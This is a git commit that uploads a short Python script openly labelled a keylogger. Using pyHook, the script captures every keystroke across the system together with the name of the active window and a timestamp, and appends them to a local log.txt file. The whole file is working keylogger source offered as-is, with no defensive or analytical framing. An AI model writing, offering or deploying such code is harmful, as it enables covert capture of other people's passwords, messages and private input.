466fe075ba32a9062356647b02c47eae6c262945
smokeroot 木 <88942153+smokeroots@users.noreply.github.com>
2021-08-25 20:19:54 -0300

    Add files via upload

---
+++ KEYLOGGER.py
@@ -0,0 +1,30 @@
+########################################
+# ->         Smoke Root             <- #
+# ->                                <- #
+# ->          KEYLOGGER             <- #
+# ->          DEVELOPED             <- #
+# ->             IN                 <- #
+# ->           PYTHON               <- #
+# ->                                <- #
+# ->       DATE: 08/21/2021         <- #
+########################################
+
+import pyHook
+import pythoncom
+
+janela = None
+
+def tecla_pressionada(evento):
+    arquivo = open('log.txt', 'a')
+    global janela
+    if evento.WindowName != janela:
+        janela = evento.WindowName
+        arquivo.write('\n' + janela + ' - ' + str(evento.Time) + '\n')
+    arquivo.write(chr(evento.Ascii))
+    arquivo.close()
+
+hook = pyHook.HookManager()
+hook.KeyDown = tecla_pressionada
+hook.HookKeyboard()
+
+pythoncom.PumpMessages()
